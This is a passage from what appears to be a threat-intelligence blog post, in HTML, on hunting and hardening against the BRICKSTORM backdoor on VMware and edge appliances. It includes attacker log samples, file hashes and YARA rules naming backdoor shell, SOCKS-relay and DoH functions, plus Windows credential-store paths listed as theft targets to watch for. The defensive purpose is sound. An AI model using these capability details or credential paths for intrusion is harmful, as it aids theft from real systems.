border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">M365 UAL</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">6</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Cloning of sensitive virtual machines</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">vSphere VPXD logs</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">7</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Creation of local vCenter and ESXi accounts</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">VMware audit events</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">8</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">SSH enablement on vSphere platform</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">VMware audit events, VAMI logs</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">9</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Rogue VMs</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">VMware audit events, VM inventory reports</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">Create or Update Asset Inventory</span></h4>\n<p><span style=\"vertical-align: baseline;\">Foundational to the success of any threat hunt is an asset inventory that includes devices not covered by the standard security tool stack, such as edge devices and other appliances. Because these appliances lack support for traditional security tools an inventory is critical for developing effective compensating controls and detections. Especially important is to track the management interface addresses of these appliances, as they act as the default gateway that malware and threat actor commands will egress out of.</span></p>\n<p><span style=\"vertical-align: baseline;\">Mandiant recommends organizations take a multi-step approach to building or updating this inventory:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Known knowns: </strong><span style=\"vertical-align: baseline;\">Begin with the appliance classes that all organizations use: firewalls, VPN concentrators, virtualization platforms, conferencing systems, badging, and file storage.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Known unknowns: </strong><span style=\"vertical-align: baseline;\">Work across teams to brainstorm appliance classes that may be more specialized to your organization, but the security organization likely lacks visibility into.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Unknown unknowns: </strong><span style=\"vertical-align: baseline;\">These are the appliances that were supposed to be decommissioned but weren’t, sales POVs, and others. Consider using network visibility tools or your existing EDR to scan for “live” IP addresses that do not show in your EDR reports. This has the added benefit of identifying unmanaged devices that should have EDR but don’t.</span></p>\n</li>\n</ol></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Asset inventory\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/brickstorm-iceberg.max-1000x1000.jpg\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 2: Asset inventory</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">File and Backup Scan for BRICKSTORM</span></h4>\n<p><span style=\"vertical-align: baseline;\">YARA rules have proven to be the most effective method for detecting BRICKSTORM binaries on appliances. We are sharing relevant YARA rules in the appendix section of this post. Yara can be difficult to run at scale, but some backup solutions provide the ability to run YARA across the backup data store. Mandiant is aware of multiple customers who have identified BRICKSTORM through this method. </span></p>\n<p><span style=\"vertical-align: baseline;\">To aid organizations in hunting for BRICKSTORM activity in their environments, </span><a href=\"https://github.com/mandiant/brickstorm-scanner\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Mandiant released a scanner script</span></a><span style=\"vertical-align: baseline;\">, which can run on appliances and other Linux or BSD-based systems. </span></p>\n<h4><span style=\"vertical-align: baseline;\">Internet Traffic from Edge Devices and Appliances</span></h4>\n<p><span style=\"vertical-align: baseline;\">Use the inventory of appliance management IP addresses to hunt for evidence of malware beaconing in network logs. In general, appliances should not communicate with the public Internet from management IP addresses except to download updates and send crash analytics to the manufacturer. </span></p>\n<p><span style=\"vertical-align: baseline;\">Established outbound traffic to domains or IP addresses not controlled by the appliance manufacturer should be regarded as very suspicious and warranting forensic review of the appliance. BRICKSTORM can use DNS over HTTP (DoH), which should be similarly rare when sourced from appliance management IP addresses.</span></p>\n<h4><span style=\"vertical-align: baseline;\">Access to Windows Systems from Appliances</span></h4>\n<p><span style=\"vertical-align: baseline;\">The threat actor primarily accessed Windows machines (both desktops and servers) using type 3 (network) logins, although in some cases the actor also established RDP sessions. Appliances should rarely log in to Windows desktops or servers and any connections should be treated as suspicious. Some examples of false positives could include VPN appliances using a known service account to connect to a domain controller in order to perform LDAP lookups and authenticated vulnerability scanners using a well-known service account. </span></p>\n<p><span style=\"vertical-align: baseline;\">In addition to EDR telemetry, Terminal Services logs and Security event logs, defenders should obtain and parse the </span><a href=\"https://learn.microsoft.com/en-us/windows-server/administration/user-access-logging/get-started-with-user-access-logging\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Windows User Access Log (UAL)</span></a><span style=\"vertical-align: baseline;\">. The UAL is stored on Windows Servers inside the directory </span><code style=\"vertical-align: baseline;\">Windows\\System32\\LogFiles\\Sum</code><span style=\"vertical-align: baseline;\"> and can be parsed using open-source tools such as </span><a href=\"https://ericzimmerman.github.io/#!index.md\" rel=\"noopener\" target=\"_blank\"><code style=\"text-decoration: underline; vertical-align: baseline;\">SumECmd</code></a><span style=\"vertical-align: baseline;\">. This log source records attempted authenticated connections to Windows systems and often retains artifacts going back much longer than typical Windows event logs. Note that this log source includes successful and unsuccessful logins, but is still useful to identify suspicious activity sourced from appliances.</span></p>\n<h4><span style=\"vertical-align: baseline;\">Access to Credentials and Secrets</span></h4>\n<p><span style=\"vertical-align: baseline;\">Use the forensic capabilities of EDR tools to acquire </span><a href=\"https://medium.com/ce-digital-forensics/shellbag-analysis-18c9b2e87ac7\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Windows Shellbags</span></a><span style=\"vertical-align: baseline;\"> artifacts from Windows workstations and servers. Shellbags records folder paths that are browsed by a user with the Windows Explorer application. Use an </span><a href=\"https://github.com/williballenthin/shellbags\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">open-source parser</span></a><span style=\"vertical-align: baseline;\"> to extract the relevant data and look for patterns of activity that are suspicious:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Access to folder paths where the initiating user is a service account, especially service accounts that are unfamiliar or rarely used</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">File browsing activity sourced from servers that include a Windows Universal Naming Convention (UNC) path that points to a workstation (e.g., </span><code style=\"vertical-align: baseline;\">\\\\bobwin7.corp.local\\browsing\\path)</code></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">File browsing activity to folder paths that contain credential data, such as:</span></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Browser profile paths (e.g., </span><code style=\"vertical-align: baseline;\">%appdata%\\Mozilla\\Firefox\\Profiles</code><span style=\"vertical-align: baseline;\">)</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Appdata locations used to store session tokens (e.g., </span><code style=\"vertical-align: baseline;\">Users\\&lt;username&gt;\\.azure\\</code><span style=\"vertical-align: baseline;\">)</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Windows credential vault (</span><code style=\"vertical-align: baseline;\">%appdatalocal%\\Microsoft\\Credentials</code><span style=\"vertical-align: baseline;\">)</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Data Protection API (DPAPI) keys (</span><code style=\"vertical-align: baseline;\">%appdata%\\Microsoft\\Protect\\&lt;SID&gt;\\</code><span style=\"vertical-align: baseline;\">)</span></p>\n</li>\n</ul>\n</ul>\n<h4><span style=\"vertical-align: baseline;\">Access to M365 Mailboxes using Enterprise Application</span></h4>\n<p><span style=\"vertical-align: baseline;\">Mandiant has observed this actor use common techniques to conduct bulk email access and exfiltration from Microsoft 365 Exchange Online. Organizations should follow our guidance outlined in our APT29 </span><a href=\"https://services.google.com/fh/files/misc/remediation-and-hardening-strategies-for-microsoft-wp-en.pdf\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">whitepaper</span></a><span style=\"vertical-align: baseline;\"> to hunt for these techniques. Although the white paper specifically references APT29, these techniques have become widely used by many groups. In multiple investigations the threat actor used a Microsoft Entra ID Enterprise Application with </span><code style=\"vertical-align: baseline;\">mail.read</code><span style=\"vertical-align: baseline;\"> or </span><code style=\"vertical-align: baseline;\">full_access_as_app</code><span style=\"vertical-align: baseline;\"> scopes to access mailboxes of key individuals in the victim organization.</span></p>\n<p><span style=\"vertical-align: baseline;\">To hunt for this activity, we recommend a phased approach:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Enumerate the Enterprise Applications and Application Registrations with graph permissions that can read all mail.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">For each application, validate that there is at least one secret or certificate configured for it. Record the Application (client) ID</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Conduct a free text search against the Unified Audit Log or the </span><code style=\"vertical-align: baseline;\">OfficeActivity</code><span style=\"vertical-align: baseline;\"> table in Sentinel for the client IDs from step 2. This will return the </span><code style=\"vertical-align: baseline;\">mailitemsaccessed</code><span style=\"vertical-align: baseline;\"> events that recorded the application accessing mail.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">For each application analyze the source IP addresses and user-agent strings for discrepancies. Legitimate usage of the applications should occur from well-defined IP addresses. Additionally, look for focused interest in key personnel mailboxes across multiple days.</span></p>\n</li>\n</ol>\n<p><span style=\"vertical-align: baseline;\">When accessing M365 and other internet-facing services the actor has used multiple commercial VPN and proxy providers. Mandiant has found evidence of the threat actor using PIA, NordVPN, Surfshark, VPN Unlimited, and PrivadoVPN, although there is no reason for these to be the only solutions used. There is also evidence to support that this actor has access to a purpose-built obfuscation network built from compromised small office/home office routers. Mandiant has no knowledge of how these routers are being compromised. The exit nodes for commercial VPNs and obfuscation networks change rapidly and sharing atomic indicators for hunting purposes is unlikely to yield results. Instead, identify the key individuals in the organization, with respect to the organization vertical and likely goals of the threat actor. Fetch </span><code style=\"vertical-align: baseline;\">mailitemsaccessed</code><span style=\"vertical-align: baseline;\"> logs for those mailboxes for the last year or as long as retention allows. Analyze the </span><code style=\"vertical-align: baseline;\">SessionID</code><span style=\"vertical-align: baseline;\"> values of the log events and look for IDs that span multiple IP addresses where the IP addresses are not in the user’s typical geographic location.</span></p>\n<h4><span style=\"vertical-align: baseline;\">Cloning of Sensitive Virtual Machines</span></h4>\n<p><span style=\"vertical-align: baseline;\">On VMware vCenter servers, VPXD logs contain valuable information for VM management related tasks such as clone events, powering on and off a VM, and creating snapshots. The threat actor often used the </span><code style=\"vertical-align: baseline;\">VSPHERE.LOCAL\\Administrator</code><span style=\"vertical-align: baseline;\"> account when cloning VMs and targeted VMs that would contain credentials such as password vaults and domain controllers. The threat actor would delete the cloned VM shortly after cloning, and primarily operated between the hours of 01:00 and 10:00 UTC. Investigators should search vCenter VPXD logs for activity that matches the aforementioned criteria and confirm if the cloning activity was intended or not.</span></p>\n<h4><span style=\"vertical-align: baseline;\">Creation of Local vCenter and ESXi Accounts</span></h4>\n<p><span style=\"vertical-align: baseline;\">Mandiant identified evidence the threat actor created a new local account to install BRICKSTORM and then removed the account after they were done. The following logs show the threat actor using the local Administrator account to create a new local account and add it to the </span><code style=\"vertical-align: baseline;\">BashShellAdministrators</code><span style=\"vertical-align: baseline;\"> group. The threat actor established an SSH connection from a compromised appliance to vCenter using the newly created account and installed the BRICKSTORM backdoor on vCenter. Shortly after, the threat actor deleted the account. Investigators should review audit logs in </span><code style=\"vertical-align: baseline;\">/var/log/audit/sso-events/audit_events.log</code><span style=\"vertical-align: baseline;\"> for the creation and deletion of local accounts and validate their purpose. In one instance, the threat actor named the account with a similar naming convention as a local service account used for backups on vCenter.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>2025-04-01T06:45:32 {\"user\":\"Administrator@VSPHERE.LOCAL\",\"client\":\"\",\"timestamp\":\"04/01/2025 06:45:32 GMT\",\"description\":\"Creating local person user '&lt;account_name&gt;' with details ('','','','','&lt;account_name&gt;@vsphere.local')\",\"eventSeverity\":\"INFO\",\"type\":\"com.vmware.sso.PrincipalManagement\"}\n\n2025-04-01T06:45:55 {\"user\":\"Administrator@VSPHERE.LOCAL\",\"client\":\"\",\"timestamp\":\"04/01/2025 06:45:55 GMT\",\"description\":\"Adding users '[{Name: &lt;account_name&gt;, Domain: vsphere.local}]' to local group 'Administrators'\",\"eventSeverity\":\"INFO\",\"type\":\"com.vmware.sso.PrincipalManagement\"}\n\n2025-04-01T06:46:23 {\"user\":\"Administrator@VSPHERE.LOCAL\",\"client\":\"\",\"timestamp\":\"04/01/2025 06:46:23 GMT\",\"description\":\"Updating local group 'SystemConfiguration.BashShellAdministrators' details ('Access bash shell and manage local users on nodes').\",\"eventSeverity\":\"INFO\",\"type\":\"com.vmware.sso.PrincipalManagement\"}\n\n2025-04-01T06:52:03 &lt;vcenter_hostname&gt; sshd[36952]: Postponed keyboard-interactive/pam for &lt;account_name&gt;@vsphere.local from &lt;compromised_system&gt;\n\n2025-04-01T06:52:30 &lt;vcenter_hostname&gt; sudo: pam_unix(sudo:session): session opened for user root\n\n2025-04-01T06:53:39 Creation of BRICKSTORM on vCenter\n\n2025-04-01T06:56:18 &lt;vcenter_hostname&gt; sudo: pam_unix(sudo:session): session closed for user root\n\n2025-04-01T06:56:25 &lt;vcenter_hostname&gt; sshd[36952]: pam_unix(sshd:session): session closed for user &lt;account_name&gt;@vsphere.local\n\n2025-04-01T06:56:57 {\"user\":\"Administrator@VSPHERE.LOCAL\",\"client\":\"\",\"timestamp\":\"04/01/2025 06:56:57 GMT\",\"description\":\"Removing principals '[{Name: &lt;account_name&gt;, Domain: vsphere.local}]' from local group 'Administrators'\",\"eventSeverity\":\"INFO\",\"type\":\"com.vmware.sso.PrincipalManagement\"}\n\n2025-04-01T06:58:12 {\"user\":\"Administrator@VSPHERE.LOCAL\",\"client\":\"\",\"timestamp\":\"04/01/2025 06:58:12 GMT\",\"description\":\"Deleting principal '&lt;account_name&gt;'\",\"eventSeverity\":\"INFO\",\"type\":\"com.vmware.sso.PrincipalManagement\"}</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">SSH Enablement on ESXi and vCenter</span></h4>\n<p><span style=\"vertical-align: baseline;\">For ESXi servers, monitoring should be set up for SSH logins using local accounts. In most organizations it is relatively rare for legitimate direct access to the ESXi hosts over SSH. In many cases the SSH server is disabled by default. Write rules to alert on log events when SSH is enabled for a vSphere platform appliance.</span></p>\n<h4><span style=\"vertical-align: baseline;\">Rogue VMs</span></h4>\n<p><span style=\"vertical-align: baseline;\">Organizations should review VMWare audit events that track the creation and deletion of new VMs, particularly using non-standard ISO images and Operating Systems. Audit events may also record the threat actor downloading archived ISO images to the datastore volumes used by vSphere. </span></p>\n<h3><span style=\"vertical-align: baseline;\">Hardening Guidance</span></h3>\n<p><span style=\"vertical-align: baseline;\">It is crucial to maintain an up-to-date inventory of appliances and other devices in the network that do not support the standard security tool stack. Any device in that inventory, whether internal or internet-facing, should be configured to follow a principle of least access.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Internet access: Appliances should not have unrestricted access to the internet. Work with your vendors or monitor your firewall logs to lock down internet access to only those domains or IP addresses that the appliance requires to function properly.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Internal network access: Appliances exposed to the internet should not have unrestricted access to internal IP address space. The management interface of most appliances does not need to establish connections to internal IP addresses. Work with the vendor to understand specific needsLDAP queries to verify user attributes for VPN logins.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Mandiant has </span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/defending-vsphere-from-unc3944\"><span style=\"text-decoration: underline; vertical-align: baseline;\">previously published guidance</span></a><span style=\"vertical-align: baseline;\"> to secure the vSphere platform from threat actors. We recommend you follow the guidance, especially the forwarding of logs to a central SIEM, enabling vSphere lockdown mode, enforcing MFA for web logins, and enforcing the </span><code style=\"vertical-align: baseline;\">execInstalledOnly</code><span style=\"vertical-align: baseline;\"> policy.</span></p>\n<p><span style=\"vertical-align: baseline;\">Organizations should assess and improve the isolation of any credential vaulting systems. In many cases if a threat actor is able to gain access to the underlying Operating System, any protected secrets can be exposed. Servers hosting credential vaulting applications should be considered Tier 0 systems and have strict access controls applied to them. Mandiant recommends organizations work with their vendors to adopt secure software practices such as storing encryption keys in the Trusted Platform Module (TPM) of the server.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Outlook and Implications </span></h3>\n<p><span style=\"vertical-align: baseline;\">Recent intrusion operations tied to BRICKSTORM likely represent an array of objectives ranging from geopolitical espionage, access operations, and intellectual property (IP) theft to enable exploit development. Based on evidence from recent investigations the targeting of the US legal space is primarily to gather information related to US national security and international trade. Additionally, GTIG assesses with high confidence that the objective of BRICKSTORM targeting SaaS providers is to gain access to downstream customer environments or the data SaaS providers host on their customers' behalf. The targeting of technology companies presents an opportunity to conduct theft of valuable IP to further the development of zero-day exploits. </span></p>\n<h3><span style=\"vertical-align: baseline;\">Acknowledgements </span></h3>\n<p><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">This analysis would not have been possible without the assistance from across Google Threat Intelligence Group, Mandiant Consulting and FLARE. We would like to specifically thank Nick Simonian from GTIG Research and Discovery (RAD). We would also like to thank Ryan Tomcik from Mandiant Threat Defense (MTD) for contributing network detection content</span>. </span></p>\n<h3><span style=\"vertical-align: baseline;\">Indicators of Compromise</span></h3>\n<p><span style=\"vertical-align: baseline;\">The following indicators of compromise are available in a <a href=\"https://www.virustotal.com/gui/collection/cedb89304a0a11fc60ebe24cb7f3f42683d19132851e3e97199860359fe4d26c/summary\" rel=\"noopener\" target=\"_blank\">Google Threat Intelligence (GTI) collection</a>. Note that Mandiant has not observed instances where the threat actor reused a malware sample and hunting for the exact indicators is unlikely to yield results.</span></p></div>\n<div class=\"block-paragraph_advanced\"><div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong><span style=\"vertical-align: baseline;\">SHA-256 Hash</span></strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong><span style=\"vertical-align: baseline;\">File Name</span></strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong><span style=\"vertical-align: baseline;\">Description</span></strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">90b760ed1d0dcb3ef0f2b6d6195c9d852bcb65eca293578982a8c4b64f51b035</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">pg_update</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">BRICKSTORM</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">2388ed7aee0b6b392778e8f9e98871c06499f476c9e7eae6ca0916f827fe65df</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">spclisten</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">BRICKSTORM</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">aa688682d44f0c6b0ed7f30b981a609100107f2d414a3a6e5808671b112d1878</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">vmp</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">BRICKSTORM</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">YARA Detections</span></h3>\n<h4><span style=\"vertical-align: baseline;\">G_APT_Backdoor_BRICKSTORM_3</span></h4></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>rule G_APT_Backdoor_BRICKSTORM_3 {\n\tmeta:\n\t\tauthor = \"Google Threat Intelligence Group (GTIG)\"\nstrings:\n\t\t$str1 = { 48 8B 05 ?? ?? ?? ?? 48 89 04 24 E8 ?? ?? ?? ?? 48 B8 ?? ?? ?? ?? ?? ?? ?? ?? 48 89 04 24 [0-5] E8 ?? ?? ?? ?? EB ?? }\n\t\t$str2 = \"regex\" ascii wide nocase\n\t\t$str3 = \"mime\" ascii wide nocase\n\t\t$str4 = \"decompress\" ascii wide nocase\n\t\t$str5 = \"MIMEHeader\" ascii wide nocase\n\t\t$str6 = \"ResolveReference\" ascii wide nocase\n\t\t$str7 = \"115792089210356248762697446949407573529996955224135760342422259061068512044369115792089210356248762697446949407573530086143415290314195533631308867097853951\" ascii wide nocase\n\tcondition:\n\t\tuint16(0) == 0x457F and all of them\n}</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">G_Backdoor_BRICKSTORM_2</span></h4></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>rule G_Backdoor_BRICKSTORM_2 {\n\tmeta:\n\t\tauthor = \"Google Threat Intelligence Group (GTIG)\"\n\tstrings:\n\t\t$obf_func = /[a-z]{20}\\/[a-z]{20}\\/[a-z]{20}\\/[a-z]{20}.go/\n\t\t$decr1 = { 0F B6 4C 04 ?? 0F B6 54 04 ?? 31 D1 88 4C 04 ?? 48 FF C0 [0-4] 48 83 F8 ?? 7C }\n\t\t$decr2 = { 40 88 7C 34 34 48 FF C3 48 FF C6 48 39 D6 7D 18 0F B6 3B 48 39 CE 73 63 44 0F B6 04 30 44 31 C7 48 83 FE 04 72 DA }\n\t\t$decr3 = { 0F B6 54 0C ?? 0F B6 5C 0C ?? 31 DA 88 14 08 48 FF C1 48 83 F9 ?? 7C E8 }\n\t\t$str1 = \"main.selfWatcher\"\n\t\t$str2 = \"main.copyFile\"\n\t\t$str3 = \"main.startNew\"\n\t\t$str4 = \"WRITE_LOG=true\"\n\t\t$str5 = \"WRITE_LOGWednesday\"\n\t\t$str6 = \"vami-httpdvideo/webm\"\n\t\t$str7 = \"/opt/vmware/sbin/\"\n\t\t$str8 = \"/home/vsphere-ui/\"\n\t\t$str9 = \"/opt/vmware/sbin/vami-http\"\n\t\t$str10 = \"main.getVFromEnv\"\n\tcondition:\n\t\tuint32(0) == 0x464c457f and ((any of ($decr*) and $obf_func) or (any of ($decr*) and any of ($str*)) or 5 of ($str*)) and filesize &lt; 10MB\n}</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">G_APT_Backdoor_BRICKSTORM_1</span></h4></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>rule G_APT_Backdoor_BRICKSTORM_1 {\n\tmeta:\n\t\tauthor = \"Google Threat Intelligence Group (GTIG)\"\n\tstrings:\n\t\t$ = \"WRITE_LOGWednesday\"\n\t\t$ = \"/home/vsphere-ui/\"\n\t\t$ = \"WRITE_LOG=true\"\n\t\t$ = \"dns rcode: %v\"\n\t\t$ = \"dns query not specified or too small\"\n\t\t$ = \"/dev/pts: bad file descriptor\"\n\t\t$ = \"/libs/doh.Query\"\n\t\t$ = \"/libs/doh.createDnsMessage\"\n\t\t$ = \"/libs/doh.unpackDnsMessage\"\n\t\t$ = \"/core/protocol/websocket.(*WebSocketNetConfig).Dial\"\n\t\t$ = \"/core/protocol/websocket.(*connection).Read\"\n\t\t$ = \"/core/protocol/websocket.(*connection).getReader\"\n\t\t$ = \"/core/protocol/websocket.(*connection).Write\"\n\t\t$ = \"/core/protocol/websocket.(*connection).Close\"\n\t\t$ = \"/core/protocol/websocket.(*connection).LocalAddr\"\n\t\t$ = \"/core/protocol/websocket.(*connection).RemoteAddr\"\n\t\t$ = \"/core/protocol/websocket.(*connection).SetDeadline\"\n\t\t$ = \"/core/protocol/websocket.(*connection).SetReadDeadline\"\n\t\t$ = \"/core/protocol/websocket.(*connection).SetWriteDeadline\"\n\t\t$ = \"/core/protocol.UnPackHeaderData\"\n\t\t$ = \"/core/protocol.NewWebSocketClient\"\n\t\t$ = \"/libs/func1.(*Client).BackgroundRun\"\n\t\t$ = \"/libs/func1.CreateClient\"\n\t\t$ = \"/libs/func1.NewService\"\n\t\t$ = \"/libs/func1.(*Service).Get\"\n\t\t$ = \"/libs/func1.(*Service).DoTask\"\n\t\t$ = \"/libs/func1.(*Service).Put\"\n\t\t$ = \"/core/extends/command.Command\"\n\t\t$ = \"/core/extends/command.CommandNoContext\"\n\t\t$ = \"/core/extends/command.ExecuteCmd\"\n\t\t$ = \"/core/extends/command.RunShell\"\n\t\t$ = \"/core/extends/socks.UnPackHeaderData\"\n\t\t$ = \"/core/extends/socks.handleRelay\"\n\t\t$ = \"/libs/fs.(*RemoteDriver).realPath\"\n\t\t$ = \"/libs/fs.(*RemoteDriver).ChangeDir\"\n\t\t$ = \"/libs/fs.(*RemoteDriver).Stat\"\n\t\t$ = \"/libs/fs.(*SimplePerm).GetMode\"\n\t\t$ = \"/libs/fs.(*SimplePerm).GetOwner\"\n\t\t$ = \"/libs/fs.(*SimplePerm).GetGroup\"\n\t\t$ = \"/libs/fs.(*RemoteDriver).ListDir\"\n\t\t$ = \"/libs/fs.(*RemoteDriver).DeleteDir\"\n\t\t$ = \"/libs/fs.(*RemoteDriver).DeleteFile\"\n\t\t$ = \"/libs/fs.(*RemoteDriver).Rename\"\n\t\t$ = 